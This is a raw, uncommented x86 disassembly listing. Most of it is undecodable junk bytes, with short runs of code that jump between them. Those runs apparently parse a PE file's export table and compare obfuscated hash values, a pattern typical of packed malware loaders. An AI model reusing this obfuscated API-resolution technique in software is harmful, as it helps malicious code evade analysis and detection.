  408db8:	cmp    eax,0x1fd4418c
  408dbd:	xlat   BYTE PTR ds:[ebx]
  408dbe:	sub    al,0x71
  408dc0:	jb     0x408d8f
  408dc2:	cwde   
  408dc3:	and    dh,BYTE PTR [ebp+0x63c3387]
  408dc9:	jns    0x408d7a
  408dcb:	sbb    dl,bl
  408dcd:	mov    esi,0xca652527
  408dd2:	push   edx
  408dd3:	jns    0x408db8
  408dd5:	test   eax,0xd908d44e
  408dda:	mov    ebp,0x227f014
  408ddf:	mov    BYTE PTR [edx-0x5b4a10a2],dl
  408de5:	jb     0x408e46
  408de7:	iret   
  408de8:	or     eax,0x428b9c45
  408ded:	leave  
  408dee:	setno  al
  408df1:	mov    cl,0x7a
  408df4:	push   0x23
  408df6:	nop
  408df7:	inc    ebx
  408df8:	mov    al,0xa8
  408dfa:	pop    ebx
  408dfb:	pop    eax
  408dfc:	and    eax,0xe5e230af
  408e01:	xchg   DWORD PTR [eax-0x5d4b797c],ebp
  408e07:	(bad)  
  408e08:	ret    0x2983
  408e0b:	shr    BYTE PTR [ebx-0x68d989ae],cl
  408e11:	mov    edx,0xf6fab521
  408e16:	in     al,0xa1
  408e18:	xor    eax,0x64c80da
  408e1d:	jnp    0x408e3a
  408e1f:	ror    DWORD PTR [ebx-0x31],0x68
  408e23:	popf   
  408e24:	sub    bh,BYTE PTR [edi-0x3ba749a]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0xd82d3405
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	pushf  
  408ec5:	sub    eax,0xb4dcb895
  408eca:	lods   al,BYTE PTR ds:[esi]
  408ecb:	cwde   
  408ecc:	sub    DWORD PTR [edi-0x44791636],esp
  408ed2:	std    
  408ed3:	(bad)  
  408ed4:	cmp    ch,BYTE PTR [edi+0x200c8397]
  408eda:	js     0x408f46
  408edc:	fst    DWORD PTR [ecx]
  408ede:	test   BYTE PTR [eax],bl
  408ee0:	xchg   edx,eax
  408ee1:	adc    ah,BYTE PTR [edx]
  408ee3:	out    0x77,eax
  408ee5:	pop    edx
  408ee6:	jne    0x408f49
  408ee8:	pop    edi
  408ee9:	mov    dh,0xac
  408eeb:	and    ah,BYTE PTR [esi+0x45fa3652]
  408ef1:	sbb    BYTE PTR [eax+0x3a41575c],dh
  408ef7:	leave  
  408ef8:	push   ecx
  408ef9:	fcompp 
  408efb:	mov    ds:0x532bbe3a,eax
  408f00:	in     al,0x42
  408f02:	cmp    al,0x82
  408f04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f05:	or     DWORD PTR fs:[eax+0x12f79104],ebx
  408f0c:	xor    BYTE PTR [esi+0x17158297],ch
  408f12:	jmp    0x8957:0xa3237221
  408f19:	inc    BYTE PTR [ecx-0x177c8bf7]
  408f1f:	sbb    eax,0x6f7cef66
  408f24:	ins    DWORD PTR es:[edi],dx
  408f25:	stos   BYTE PTR es:[edi],al
  408f26:	ja     0x408f5b
  408f28:	xchg   ebp,eax
  408f29:	call   0xd2d6:0x686a20d7
  408f30:	cmc    
  408f31:	pop    edi
  408f32:	sar    DWORD PTR [ecx-0x48],1
  408f35:	lds    ebx,FWORD PTR ds:0xd9c15b36
  408f3b:	jmp    0x408ef7
  408f3d:	sbb    DWORD PTR [ecx+edi*4-0x21cada71],ebx
  408f44:	push   0xffffffd2
  408f46:	leave  
  408f47:	mov    ds:0xe5f2005f,al
  408f4c:	or     ch,BYTE PTR [ecx]
  408f4e:	adc    DWORD PTR [eax-0x11461455],edi
  408f54:	fst    DWORD PTR [esi+esi*2-0x403124e7]
  408f5b:	gs inc ecx
  408f5d:	lods   eax,DWORD PTR ds:[esi]
  408f5e:	mov    ecx,esi
  408f60:	loope  0x408f22
  408f62:	xchg   esp,eax
  408f63:	imul   edx,ecx,0xffffffc9
  408f66:	fisubr DWORD PTR [eax]
  408f68:	sbb    eax,0xece74988
  408f6d:	cs sbb al,0x55
  408f70:	cdq    
  408f71:	jo     0x408fcc
  408f73:	mov    DWORD PTR [edx+0x78],0x8b789323
  408f7a:	jbe    0x408faf
  408f7c:	scas   eax,DWORD PTR es:[edi]
  408f7d:	mov    bh,0x6
  408f7f:	cwde   
  408f80:	mov    esp,0x9263d60a
  408f85:	pushf  
  408f86:	xrelease mov DWORD PTR [edi],esp
  408f89:	pusha  
  408f8a:	mov    ah,0x68
  408f8c:	mov    dh,0x8b
  408f8e:	inc    edx
  408f8f:	fdivr  st,st(4)
  408f91:	fldenv [esi]
  408f93:	mov    DWORD PTR [esi+0x46],edi
  408f96:	(bad)  
  408f97:	stc    
  408f98:	adc    eax,0x8ceaec58
  408f9d:	mov    esi,ds
  408f9f:	push   ds
  408fa0:	pop    eax
  408fa1:	mov    edx,ebx
  408fa3:	shr    ebx,1
  408fa5:	aas    
  408fa6:	aam    0xbf
  408fa8:	ja     0x408ffd
  408faa:	jl     0x408fec
  408fac:	mov    bl,BYTE PTR [ecx+0x2a]
  408faf:	out    dx,al
  408fb0:	je     0x408f88
  408fb2:	lock inc esi
  408fb4:	jecxz  0x408fc8
  408fb6:	push   ds
  408fb7:	and    ch,BYTE PTR ds:0xc1f74541
  408fbd:	std    
  408fbe:	dec    edx
  408fbf:	out    dx,al
  408fc0:	jno    0x408fdd
  408fc2:	(bad)  
  408fc3:	call   0xd1038182
  408fc8:	sub    DWORD PTR [eax-0xa],eax
  408fcb:	ret    
  408fcc:	mov    DWORD PTR [eax-0x4a4f5a39],ebp
  408fd2:	push   edx
  408fd3:	scas   eax,DWORD PTR es:[edi]
  408fd4:	scas   eax,DWORD PTR es:[edi]
  408fd5:	sti    
  408fd6:	mov    BYTE PTR [edx-0x444304bc],dl
  408fdc:	mov    ch,0xf4
  408fde:	out    0x11,al
  408fe0:	shl    BYTE PTR [ebx],cl
  408fe2:	sbb    al,0x15
  408fe4:	out    dx,eax
  408fe5:	les    edx,FWORD PTR [eax+ebx*1-0x71836036]
  408fec:	jno    0x409065
  408fee:	push   cs
  408fef:	cmp    al,0xe6
  408ff1:	ret    
  408ff2:	cli    
  408ff3:	cmc    
  408ff4:	mov    ch,0x59
  408ff6:	dec    ecx
  408ff7:	adc    al,0x4f
  408ff9:	int    0xa5
  408ffb:	xor    edx,DWORD PTR [edx-0x56]
  408ffe:	pop    edx
  408fff:	pop    ss
  409000:	repz ret 
  409002:	retf   
  409003:	add    DWORD PTR [esi-0x5c9c2a7b],ebx
  409009:	scas   eax,DWORD PTR es:[edi]
  40900a:	sbb    BYTE PTR [eax-0x518c7a0c],dl
  409010:	fadd   DWORD PTR [ebx-0x57]
  409013:	jle    0x40902f
  409015:	mov    ebp,0xaf0c8222
  40901a:	scas   eax,DWORD PTR es:[edi]
  40901b:	data16 mov bh,0xa
  40901e:	stos   DWORD PTR es:[edi],eax
  40901f:	(bad)  [edi+0x157d5f55]
  409025:	lods   al,BYTE PTR ds:[esi]
  409026:	mov    ds:0xf9e5a6a4,eax
  40902b:	add    BYTE PTR [esi],al
  40902d:	xchg   esi,eax
  40902e:	das    
  40902f:	mov    esi,0x489b111e
  409034:	sub    ebp,edi
  409036:	aaa    
  409037:	(bad)  
  409038:	in     eax,0x68
  40903a:	mov    ecx,0x910233c3
  40903f:	aas    
  409040:	test   eax,0xaf6b6c65
  409045:	(bad)  
  409046:	pop    eax
  409047:	or     DWORD PTR [edx+ebx*8],esi
  40904a:	mov    dh,0xc4
  40904c:	add    DWORD PTR [edi+0x7602b101],esi
  409052:	xchg   esi,eax
  409053:	adc    ah,BYTE PTR [ecx+eax*1-0x6b]
  409057:	sub    al,0x5f
  409059:	lock xchg esp,eax
  40905b:	mov    cl,0xeb
  40905d:	xor    BYTE PTR [edx-0x4262cc5],bl
  409063:	addr16 sahf 
  409065:	retf   0x4f7a
  409068:	lds    ebx,FWORD PTR [ebx+0x47]
  40906b:	sahf   
  40906c:	sub    ecx,0xffffff94
  40906f:	pushf  
  409070:	fimul  DWORD PTR [eax+ebx*2-0x6e]
  409074:	aas    
  409075:	fsubr  st(2),st
  409077:	or     DWORD PTR gs:[ecx],esp
  40907a:	ficomp WORD PTR [edi]
  40907c:	sbb    DWORD PTR [edx],ecx
  40907e:	inc    esi
  40907f:	mov    dh,0x48
  409081:	xor    BYTE PTR [edi-0x7885daaf],bl
  409087:	mov    ebp,0x31b85760
  40908c:	inc    edx
  40908d:	sbb    BYTE PTR [ebx-0x26],ch
  409090:	ja     0x409026
  409092:	inc    cx
  409094:	xchg   edi,eax
  409095:	mov    edx,DWORD PTR [esi-0x494d0cce]
  40909b:	out    0xef,al
  40909d:	sub    al,0xa5
  40909f:	cmp    esi,ebp
  4090a1:	cmp    ebx,DWORD PTR ds:[edi+0x47]
  4090a5:	aam    0x47
  4090a7:	dec    ecx
  4090a8:	pop    es
  4090a9:	jl     0x409036
  4090ab:	fs int 0x67
  4090ae:	xor    DWORD PTR [ecx+0x15],ebx
  4090b1:	neg    DWORD PTR [esi+esi*4+0x54102aed]
  4090b8:	sti    
  4090b9:	mov    esi,DWORD PTR [ecx+0x23bb95fe]
  4090bf:	data16 jp 0x409068
  4090c2:	out    dx,al
  4090c3:	ret    
  4090c4:	sub    bl,BYTE PTR [esi-0xa6afa1b]
  4090ca:	xlat   BYTE PTR ds:[ebx]
  4090cb:	stos   BYTE PTR es:[edi],al
  4090cc:	test   al,0x52
  4090ce:	jo     0x409145
  4090d0:	fidivr DWORD PTR [edi+0x34ddc4e6]
  4090d6:	imul   ecx,DWORD PTR [edx-0x20c30bd9],0xffffffb2
  4090dd:	push   edx
  4090de:	sbb    ah,BYTE PTR [ebx]
  4090e0:	xchg   BYTE PTR [edi+eiz*4+0x54],dl
  4090e4:	sbb    BYTE PTR [ebx-0x36],al
  4090e7:	jne    0x40911e
  4090e9:	loop   0x409154
  4090eb:	inc    esi
  4090ec:	arpl   WORD PTR [eax-0x38fc39cd],si
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0xae
  409163:	ret    0xc1b6
  409166:	xor    bl,bh
  409168:	jle    0x4091e8
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	push   ebx
  40916f:	push   edi
  409170:	cwde   
  409171:	std    
  409172:	repnz popf 
  409174:	test   DWORD PTR [ecx+0x9244de1],0xd5ecf131
  40917e:	fldz   
  409180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409181:	add    al,0x29
  409183:	hlt    
  409184:	jmp    0x409152
  409186:	sub    eax,0x3227279f
  40918b:	ret    0x1a5
  40918e:	lods   eax,DWORD PTR gs:[esi]
  409190:	lea    edi,[edx-0x2ac178b7]
  409196:	in     al,0x8
  409198:	ss repnz sti 
  40919b:	xchg   edx,eax
  40919c:	push   edx
  40919d:	mov    al,ds:0x82683ff0
  4091a2:	xor    cl,BYTE PTR [edi-0x36573625]
  4091a8:	add    DWORD PTR [ecx+eiz*4],0xffffffac
  4091ac:	cmp    DWORD PTR [ecx+0x5c0e87e7],ebp
  4091b2:	stos   BYTE PTR es:[edi],al
  4091b3:	rol    DWORD PTR [ecx],1
  4091b5:	adc    DWORD PTR [ebx+0x6dcb2a31],edi
  4091bb:	inc    esi
  4091bc:	(bad)  
  4091be:	fisubr DWORD PTR ds:0x1e5b8acf
  4091c4:	jp     0x409223
  4091c6:	arpl   WORD PTR [edi],bp
  4091c8:	adc    al,0x70
  4091ca:	mov    cs,WORD PTR [edx-0x10566047]
  4091d0:	jnp    0x409247
  4091d2:	inc    esi
  4091d3:	mov    dh,0x68
  4091d5:	iret   
  4091d6:	imul   eax,DWORD PTR [ebp-0x2b0914f4],0xc5cc90b2
  4091e0:	mov    ds:0x2bd5ceef,al
  4091e5:	mov    esp,0xfb5dba4c
  4091ea:	jns    0x409223
  4091ec:	sub    cl,ch
  4091ee:	ret    0x1c7b
  4091f1:	push   ebp
  4091f2:	mov    WORD PTR [ebx],gs
  4091f4:	rol    DWORD PTR [edx+eax*8+0x34],0xa9
  4091f9:	sbb    al,0x60
  4091fb:	push   ebx
  4091fc:	xchg   ebx,eax
  4091fd:	iret   
  4091fe:	es into 
  409200:	ins    DWORD PTR es:[edi],dx
  409201:	cld    
  409202:	icebp  
  409203:	mov    dl,0x9
  409205:	adc    edi,DWORD PTR ds:0x56d78450
  40920b:	or     DWORD PTR [ebx],0x9c1dc7d8
  409211:	xor    al,0xa8
  409213:	into   
  409214:	mov    ebp,DWORD PTR [ecx]
  409216:	push   es
  409217:	pop    esi
  409218:	shl    DWORD PTR [eax-0x27b4428c],1
  40921e:	out    0x8a,al
  409220:	aad    0x33
  409222:	mov    WORD PTR [ecx+0x6f],es
  409225:	loopne 0x40923e
  409227:	push   ebp
  409228:	hlt    
  409229:	pop    edi
  40922a:	in     eax,dx
  40922b:	dec    ebx
  40922c:	arpl   WORD PTR [edi],dx
  40922e:	ja     0x40924f
  409230:	mov    dh,0xc7
  409232:	lock retf 0x41fd
  409236:	xchg   BYTE PTR [ebp+0x1b9f50d0],bh
  40923c:	cdq    
  40923d:	or     al,0xc8
  40923f:	popa   
  409240:	xor    eax,0xa37120d7
  409245:	sti    
  409246:	daa    
  409247:	jnp    0x40922c
  409249:	sahf   
  40924a:	retf   0xa736
  40924d:	stos   BYTE PTR es:[edi],al
  40924e:	into   
  40924f:	xchg   ecx,eax
  409250:	pop    esp
  409251:	retf   
  409252:	sahf   
  409253:	test   DWORD PTR [edx],0x8228931d
  409259:	(bad)
  40925c:	mov    dl,0xaf
  40925e:	xlat   BYTE PTR ds:[ebx]
  40925f:	mov    BYTE PTR [ecx+0x64bd1316],ch
  409265:	lahf   
  409266:	push   ebx
  409267:	push   eax
  409268:	ins    BYTE PTR es:[edi],dx
  409269:	into   
  40926a:	push   ds
  40926b:	jecxz  0x409283
  40926d:	in     al,0x73
  40926f:	xchg   esp,eax
  409270:	pusha  
  409271:	inc    esp
  409272:	add    DWORD PTR [ecx+0x8],esp
  409275:	dec    edi
  409276:	inc    esi
  409277:	test   eax,0x977c1dbb
  40927c:	sbb    dh,BYTE PTR [ecx*4+0x587e727f]
  409283:	adc    al,0x3d
  409285:	lds    esp,FWORD PTR [edx+0x31]
  409288:	popa   
  409289:	sub    ch,ch
  40928b:	stc    
  40928c:	or     al,BYTE PTR [ebp-0x3]
  40928f:	push   di
  409291:	int    0x70
  409293:	pop    ecx
  409294:	out    dx,al
  409295:	mov    esp,0x2dec236d
  40929a:	jmp    0x40923a
  40929c:	dec    ebx
  40929d:	ss jecxz 0x4092a8
  4092a0:	xchg   DWORD PTR [ebp-0x7c],esi
  4092a3:	sbb    al,0x96
  4092a5:	and    dl,dh
  4092a7:	mov    al,0xb7
  4092a9:	cli    
  4092aa:	mov    ch,dh
  4092ac:	adc    edi,ebx
  4092ae:	repnz push edx
  4092b0:	repz push cs
  4092b2:	or     dl,BYTE PTR [ecx-0x1e42da27]
  4092b8:	jp     0x4092dc
  4092ba:	adc    al,0x31
  4092bc:	(bad)  
  4092bd:	pushf  
  4092be:	xchg   edi,esp
  4092c0:	inc    DWORD PTR [ebx-0x3ff94b90]
  4092c6:	fild   WORD PTR [ebp+edx*4-0x1a505f6e]
  4092cd:	pushf  
  4092ce:	inc    ecx
  4092cf:	dec    ebx
  4092d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092d1:	adc    bl,BYTE PTR [edi-0x333197d6]
  4092d7:	push   es
  4092d8:	icebp  
  4092d9:	or     bl,BYTE PTR ds:0xaf05827c
  4092df:	cmp    cl,BYTE PTR [edi-0x31fb7b07]
  4092e5:	mov    dl,0x8d
  4092e7:	(bad)  
  4092e8:	mov    ah,0x22
  4092ea:	jecxz  0x40935a
  4092ec:	jge    0x409351
  4092ee:	adc    eax,0x6e0f02f2
  4092f3:	bound  eax,QWORD PTR ss:[edx]
  4092f6:	movhps QWORD PTR [esi-0x736c30a0],xmm6
  4092fd:	or     esi,DWORD PTR [ecx+0x32d4a906]
  409303:	add    al,0x21
  409305:	std    
  409306:	daa    
  409307:	xchg   esi,eax
  409308:	dec    ecx
  409309:	sbb    ch,dh
  40930b:	mov    dl,BYTE PTR [eax-0x44]
  40930e:	jb     0x409323
  409310:	mov    DWORD PTR [ecx-0x543c11f4],esp
  409316:	and    BYTE PTR [eax+0x25],ah
  409319:	add    BYTE PTR [edi-0x23f5e34c],ah
  40931f:	jns    0x409345
  409321:	cmp    bh,BYTE PTR [edi-0x7d1d0caf]
  409327:	cmp    ecx,DWORD PTR [esi]
  409329:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40932a:	push   ebx
  40932b:	sbb    ah,BYTE PTR [ebp-0x16]
  40932e:	cdq    
  40932f:	inc    ebp
  409330:	jno    0x409352
  409332:	dec    ecx
  409333:	jg     0x409386
  409335:	mov    bl,0x93
  409337:	pop    ds
  409338:	jne    0x409340
  40933a:	loop   0x409366
  40933c:	out    dx,al
  40933d:	mov    WORD PTR [ebx+0x33],?
  409340:	jnp    0x40934a
  409342:	cmp    ah,0xdd
  409345:	push   cs
  409346:	push   cs
  409347:	fsubr  QWORD PTR [edx+0xc2876ff]
  40934d:	sub    BYTE PTR [ebx],ah
  40934f:	out    dx,eax
  409350:	fs mov ch,0x46
  409353:	sub    ebx,DWORD PTR [edi+ebx*4-0x1b3b3fc5]
  40935a:	push   edi
  40935b:	in     al,0x65
  40935d:	xor    eax,esp
  40935f:	shl    BYTE PTR ds:0x38284d64,1
  409365:	cmp    DWORD PTR [ebx+0x7ed9b376],0xffffffff
  40936c:	or     BYTE PTR [ebx+0x15],0x3f
  409370:	jl     0x4093d0
  409372:	pop    es
  409373:	mov    ebx,0x4080e8b3
  409378:	pop    esp
  409379:	jnp    0x4093ea
  40937b:	jmp    0x29bed2e
  409380:	cmp    al,0xf5
  409382:	in     eax,dx
  409383:	or     DWORD PTR [ecx+0x2e02fc58],0xffffff95
  40938a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40938b:	imul   ebx,DWORD PTR [edx-0x5c],0x3b
  40938f:	mov    al,0xe4
  409391:	imul   ebx,ecx,0xffffffe2
  409394:	sti    
  409395:	stos   BYTE PTR es:[edi],al
  409396:	fwait
  409397:	push   ss
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	ins    DWORD PTR es:[edi],dx
  4093b5:	(bad)  
  4093b6:	enter  0xd880,0xdd
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	jmp    0x8c3b:0x478fff60
  4093c7:	fs jl  0x4093e8
  4093ca:	mov    ds:0x935b6d4a,al
  4093cf:	pop    ecx
  4093d0:	jl     0x4093fa
  4093d2:	dec    edi
  4093d3:	loopne 0x4093d9
  4093d5:	dec    edi
  4093d6:	push   ds
  4093d7:	aaa    
  4093d8:	and    BYTE PTR [ebx-0x5a686e8],al
  4093de:	das    
  4093df:	addr16 cld 
  4093e1:	sbb    al,0x6e
  4093e3:	lahf   
  4093e4:	jo     0x40941d
  4093e6:	jle    0x409438
  4093e8:	pop    ss
  4093e9:	(bad)  
  4093eb:	mov    ebp,0xa390ec66
  4093f0:	enter  0xe7bb,0x5a
  4093f4:	lea    esp,[edx+0x18]
  4093f7:	inc    edi
  4093f8:	pop    es
  4093f9:	fcomp  QWORD PTR [ebp+0x741a1427]
  4093ff:	dec    edi
  409400:	mov    eax,ds:0xda15da73
  409405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409406:	mov    ch,BYTE PTR [eax+0x78f4b3ee]
  40940c:	sub    BYTE PTR [eax+eiz*1+0x208326c7],bl
  409413:	jl     0x409441
  409415:	adc    ch,BYTE PTR [edi+0x67]
  409418:	pop    esi
  409419:	scas   al,BYTE PTR es:[edi]
  40941a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40941b:	fidiv  DWORD PTR [eax+0x33a47c1a]
  409421:	or     BYTE PTR [ecx-0x69cea662],dh
  409427:	scas   eax,DWORD PTR es:[edi]
  409428:	out    0x53,al
  40942a:	pusha  
  40942b:	aaa    
  40942c:	jle    0x40945c
  40942e:	test   al,0x64
  409430:	inc    ebx
  409431:	pop    edx
  409432:	fs dec ebp
  409434:	add    eax,0x71aa0768
  409439:	dec    esp
  40943a:	mov    bl,0x33
  40943c:	jge    0x4093d9
  40943e:	xor    cl,bh
  409440:	xchg   esp,eax
  409441:	ficom  WORD PTR [ebx-0x62]
  409444:	xor    BYTE PTR [ecx*4+0x3c7eb073],bh
  40944b:	bound  esi,QWORD PTR [ecx+ecx*2-0x28a037d8]
  409452:	dec    eax
  409453:	jecxz  0x40942a
  409455:	shl    DWORD PTR [ebp+0x5a],1
  409458:	inc    eax
  409459:	sub    DWORD PTR [edi],ebx
  40945b:	add    DWORD PTR [esi+0x64bf6ab],eax
  409461:	outs   dx,DWORD PTR ds:[esi]
  409462:	ret    
  409463:	cmp    eax,0xef40af81
  409468:	icebp  
  409469:	mov    eax,0xab7f26ad
  40946e:	cdq    
  40946f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409470:	mov    esi,0xc11abb
  409475:	adc    al,0xe2
  409477:	add    bh,BYTE PTR [ecx]
  409479:	fwait
  40947a:	retf   0x664e
  40947d:	sar    DWORD PTR [edi-0x13cb30bd],0x88
  409484:	or     BYTE PTR [ecx+0x5a],bl
  409487:	mov    edi,0x6cfd6093
  40948c:	mov    ds,WORD PTR [ebp-0x3782937e]
  409492:	push   edi
  409493:	xor    BYTE PTR [esp+ebx*2-0x76],bh
  409497:	ja     0x40949a
  409499:	std    
  40949a:	mov    DWORD PTR [esi+0x114b4e42],esp
  4094a0:	sub    eax,0x20c13bf3
  4094a5:	enter  0x3912,0x7b
  4094a9:	sbb    bl,BYTE PTR [esi+esi*2+0x3e]
  4094ad:	add    BYTE PTR [edx+0x22],0x95
  4094b1:	or     al,0x27
  4094b3:	pushf  
  4094b4:	xchg   edi,eax
  4094b5:	stos   BYTE PTR es:[edi],al
  4094b6:	mov    al,0xf7
  4094b8:	pop    edx
  4094b9:	rol    DWORD PTR [ecx+edx*2],0x1f
  4094bd:	test   BYTE PTR ds:0x6847a12d,ch
  4094c3:	(bad)  
  4094c4:	arpl   WORD PTR [ebx+0x41],ax
  4094c7:	shr    BYTE PTR [eax-0x312bdc90],cl
  4094cd:	ins    DWORD PTR es:[edi],dx
  4094ce:	mov    esp,0x34b43650
  4094d3:	mov    eax,ds:0xf94f791c
  4094d8:	add    cl,BYTE PTR [ecx+0x2e4d00e5]
  4094de:	rol    DWORD PTR [edi+0x6b],cl
  4094e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094e2:	in     eax,0x7a
  4094e4:	dec    ebp
  4094e5:	popf   
  4094e6:	ffree  st(7)
  4094e8:	or     DWORD PTR [ebx+edx*2],0x2c4a4510
  4094ef:	sub    al,0x7f
  4094f1:	test   eax,0x2328a93e
  4094f6:	jp     0x4094ce
  4094f8:	mov    WORD PTR [eax+0x495c88e6],?
  4094fe:	icebp  
  4094ff:	inc    edi
  409500:	dec    esp
  409501:	aam    0x5e
  409503:	stos   DWORD PTR es:[edi],eax
  409504:	(bad)  
  409505:	das    
  409506:	or     bl,BYTE PTR [edi+0x7391dbc]
  40950c:	inc    esp
  40950d:	mov    bh,ch
  40950f:	es dec eax
  409511:	sub    BYTE PTR [eax+0x7e],bh
  409514:	fidiv  WORD PTR [ebx-0x28de922]
  40951a:	and    eax,0x5c127aa7
  40951f:	xlat   BYTE PTR ds:[ebx]
  409520:	pop    edx
  409521:	dec    edi
  409522:	(bad)  
  409523:	adc    al,0x74
  409525:	sahf   
  409526:	ror    DWORD PTR [ebp-0x257c344],0xfb
  40952d:	inc    edx
  40952e:	call   0xfb35:0xced0e6f8
  409535:	jl     0x4094cb
  409537:	scas   al,BYTE PTR es:[edi]
  409538:	adc    eax,0xec7b5cfb
  40953d:	lahf   
  40953e:	sub    BYTE PTR [edx+0x67],0x30
  409542:	sahf   
  409543:	outs   dx,DWORD PTR ds:[esi]
  409544:	in     eax,dx
  409545:	cs sahf 
  409547:	(bad)  
  409548:	arpl   WORD PTR [edx],dx
  40954a:	das    
  40954b:	call   0x5418:0x13bff1fa
  409552:	add    al,0x9a
  409554:	jge    0x409578
  409556:	inc    edi
  409557:	inc    eax
  409558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409559:	jnp    0x4095d3
  40955b:	mov    ch,0x70
  40955d:	pop    eax
  40955e:	fwait
  40955f:	enter  0x1f4a,0xd1
  409563:	test   DWORD PTR [eax-0x38de41a2],esp
  409569:	dec    esp
  40956a:	fst    QWORD PTR [edx+0x3c]
  40956d:	jo     0x40952c
  40956f:	xchg   esp,eax
  409570:	sar    DWORD PTR ds:0xb0ee39b2,1
  409576:	or     ah,BYTE PTR [edx-0x19]
  409579:	and    al,0x37
  40957b:	xchg   esi,eax
  40957c:	int    0x6d
  40957e:	add    al,0xed
  409580:	mov    ds:0xce368aa3,eax
  409585:	pushf  
  409586:	mov    esp,0x5961954d
  40958b:	jb     0x409516
  40958d:	jg     0x4095cb
  40958f:	ficom  WORD PTR [esi+0x6b]
  409592:	popf   
  409593:	int3   
  409594:	out    0xe3,eax
  409596:	mov    bl,bh
  409598:	xchg   edx,eax
  409599:	cmp    esi,0x45
  40959c:	mov    ch,0x54
  40959e:	shl    DWORD PTR [esi-0x54],1
  4095a1:	fwait
  4095a2:	sbb    ebx,DWORD PTR [ebx]
  4095a4:	std    
  4095a5:	popf   
  4095a6:	xchg   ebx,eax
  4095a7:	pop    edi
  4095a8:	sbb    al,0x7d
  4095aa:	sub    al,0xe3
  4095ac:	(bad)  
  4095ad:	mov    edx,ebp
  4095af:	dec    ebx
  4095b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095b1:	or     DWORD PTR ds:0xbab15b11,ebp
